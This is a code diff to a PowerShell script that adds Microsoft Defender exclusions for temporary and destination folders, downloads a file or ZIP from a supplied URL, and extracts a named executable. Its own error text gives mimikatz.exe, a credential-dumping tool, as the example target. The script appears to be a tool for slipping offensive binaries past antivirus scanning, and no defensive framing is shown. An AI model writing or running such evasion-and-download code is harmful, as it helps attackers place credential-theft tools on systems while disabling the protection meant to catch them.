@@ -110,8 +110,11 @@ if ($urlMode) {
     $destDir  = Split-Path $FilePath -Parent
 
     if ($isZip) {
-        # ZIP: add exclusions for the zip temp path AND destination directory
-        # before downloading — Defender scans archive contents on write
+        # ZIP: FilePath must include the target filename so the script knows what to extract
+        if (Test-Path $FilePath -PathType Container) {
+            Write-Error "ZIP download requires a full file path including the target filename — the script searches inside the ZIP for that filename.`nExample: -FilePath 'C:\Users\lobyo\mimikatz.exe' -URL '$URL'"
+            exit 1
+        }
         $zipTemp = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName() + ".zip")
         Add-MpPreference -ExclusionPath $zipTemp  -ErrorAction SilentlyContinue
         Add-MpPreference -ExclusionPath $destDir  -ErrorAction SilentlyContinue
@@ -349,13 +352,53 @@ if ($urlMode) {
     Start-Sleep -Seconds 3
     Write-Host "[+] Re-adding exclusion for final download..." -ForegroundColor Cyan
 
-    try {
-        Invoke-WebRequest -Uri $URL -OutFile $FilePath -UseBasicParsing -ErrorAction Stop
-        Write-Host "[+] Download complete." -ForegroundColor Cyan
-    } catch {
-        Remove-MpPreference -ExclusionPath $FilePath -ErrorAction SilentlyContinue
-        Write-Error "Re-download failed: $_"
-        exit 1
+    if ($isZip) {
+        $zipTemp2  = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName() + ".zip")
+        $destDir2  = Split-Path $FilePath -Parent
+        Add-MpPreference -ExclusionPath $zipTemp2 -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath $destDir2 -ErrorAction SilentlyContinue
+        try {
+            Invoke-WebRequest -Uri $URL -OutFile $zipTemp2 -UseBasicParsing -ErrorAction Stop
+            Write-Host "[+] Download complete." -ForegroundColor Cyan
+        } catch {
+            Remove-MpPreference -ExclusionPath $FilePath  -ErrorAction SilentlyContinue
+            Remove-MpPreference -ExclusionPath $zipTemp2  -ErrorAction SilentlyContinue
+            Remove-MpPreference -ExclusionPath $destDir2  -ErrorAction SilentlyContinue
+            Remove-Item $zipTemp2 -Force -ErrorAction SilentlyContinue
+            Write-Error "Re-download failed: $_"
+            exit 1
+        }
+        $extractDir2 = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName())
+        Expand-Archive -Path $zipTemp2 -DestinationPath $extractDir2 -Force
+        $found2 = Get-ChildItem -Path $extractDir2 -Recurse -Filter $fileName -File |
+                  Select-Object -First 1
+        if (-not $found2) {
+            Remove-Item $zipTemp2    -Force -ErrorAction SilentlyContinue
+            Remove-Item $extractDir2 -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-MpPreference -ExclusionPath $FilePath  -ErrorAction SilentlyContinue
+            Remove-MpPreference -ExclusionPath $zipTemp2  -ErrorAction SilentlyContinue
+            Remove-MpPreference -ExclusionPath $destDir2  -ErrorAction SilentlyContinue
+            Write-Error "$fileName not found in re-downloaded ZIP."
+            exit 1
+        }
+        if (Test-Path $FilePath) {
+            Set-ItemProperty -Path $FilePath -Name IsReadOnly -Value $false -ErrorAction SilentlyContinue
+        }
+        Copy-Item -Path $found2.FullName -Destination $FilePath -Force
+        Remove-Item $zipTemp2    -Force -ErrorAction SilentlyContinue
+        Remove-Item $extractDir2 -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-MpPreference -ExclusionPath $zipTemp2 -ErrorAction SilentlyContinue
+        Remove-MpPreference -ExclusionPath $destDir2 -ErrorAction SilentlyContinue
+        Write-Host "[+] Extracted $fileName from ZIP." -ForegroundColor Cyan
+    } else {
+        try {
+            Invoke-WebRequest -Uri $URL -OutFile $FilePath -UseBasicParsing -ErrorAction Stop
+            Write-Host "[+] Download complete." -ForegroundColor Cyan
+        } catch {
+            Remove-MpPreference -ExclusionPath $FilePath -ErrorAction SilentlyContinue
+            Write-Error "Re-download failed: $_"
+            exit 1
+        }
     }
 
     $finalHash = (Get-FileHash -Path $FilePath -Algorithm SHA256).Hash
